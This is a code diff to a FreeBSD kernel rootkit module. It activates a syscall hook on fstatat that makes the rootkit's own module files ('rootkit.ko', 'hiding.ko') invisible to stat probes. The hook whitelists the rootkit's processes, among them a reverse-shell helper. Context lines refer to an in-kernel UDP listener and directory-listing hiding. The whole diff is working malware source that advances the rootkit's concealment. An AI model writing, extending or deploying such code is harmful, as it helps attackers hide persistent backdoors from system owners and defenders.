@@ -72,6 +72,12 @@ int trigger_flag = 0;
 static struct socket *so_listen = NULL;
 static volatile int remote_thread_running = 0;
 
+/* Basename extractor: gets the part after the last '/' */
+static const char * rk_basename(const char *path) { 
+    const char *slash = strrchr(path, '/'); 
+    return (slash != NULL) ? slash + 1 : path; 
+}
+
 /* --- Background In-Kernel UDP Listener Thread --- */
 static void
 remote_listener_thread(void *arg __unused)
@@ -233,16 +239,45 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
     return error;
 }
 
-static int fstatat_hook(struct thread *td, struct fstatat_args *uap) {
-    char kpath[MAXPATHLEN];
-    size_t done;
-    if (uap->path != NULL) {
-        int error = copyinstr(uap->path, kpath, MAXPATHLEN, &done);
-        if (!error && is_hiding_path(kpath) ) {
-            return ENOENT;
-        }
-    }
-    return sys_fstatat(td, uap);
+static int fstatat_hook(struct thread *td, void *syscall_args) { 
+    struct fstatat_args /* { 
+    int fd; 
+    char *path; 
+    struct stat *sb; 
+    int flag; 
+    } */ *uap = (struct fstatat_args *)syscall_args; 
+     
+    /* 1. If path is NULL, just pass through */ 
+    if (uap->path == NULL) { 
+        return sys_fstatat(td, syscall_args); 
+    } /* 2. Whitelist rootkit's own processes so they can always find their files */ 
+    if (td != NULL && td->td_proc != NULL) { 
+        const char *comm = td->td_proc->p_comm; 
+        if (strcmp(comm, "install") == 0 || 
+            strcmp(comm, "revshell") == 0 || 
+            strcmp(comm, "remote") == 0 || 
+            strcmp(comm, "rklog") == 0 || 
+            strcmp(comm, "hide_kld") == 0 || 
+            strcmp(comm, "sh") == 0) { /* Allow /bin/sh during install scripts */ 
+            
+            return sys_fstatat(td, syscall_args); 
+        } 
+    } 
+
+    /* 3. Safely copy the requested path from user space */ 
+    char kpath[MAXPATHLEN]; 
+    size_t done; 
+    int error = copyinstr(uap->path, kpath, sizeof(kpath), &done); 
+    if (error == 0) { 
+        const char *base = rk_basename(kpath); 
+        /* \* ONLY hide internal persistence artifacts from external stat probes. \* NEVER hide elevate, remote, or /bin/sh targets! \*/ 
+        if (strcmp(base, "rootkit.ko") == 0 || strcmp(base, "hiding.ko") == 0) { 
+            return (ENOENT); 
+        } 
+    } 
+    
+    /* 4. Pass through to original FreeBSD fstatat */ 
+    return sys_fstatat(td, syscall_args); 
 }
 
 struct port_hiding_args {
@@ -385,7 +420,7 @@ static int load(module_t module, int cmd, void *arg) {
         /* Initialize character device interface via interface.c */
         error = make_rootkit_dev();
         sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
-        // sysent[SYS_fstatat].sy_call = (sy_call_t *) fstatat_hook;
+        sysent[SYS_fstatat].sy_call = (sy_call_t *) fstatat_hook;
 
         if (error == 0) {
             struct proc *p = NULL;
@@ -422,6 +457,7 @@ static int load(module_t module, int cmd, void *arg) {
         cv_destroy(&remote_cv);
         mtx_destroy(&remote_mtx);
         sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+        sysent[SYS_fstatat].sy_call = (sy_call_t *)sys_fstatat;
         printf("rootkit: module unloaded\n");
         break;
 
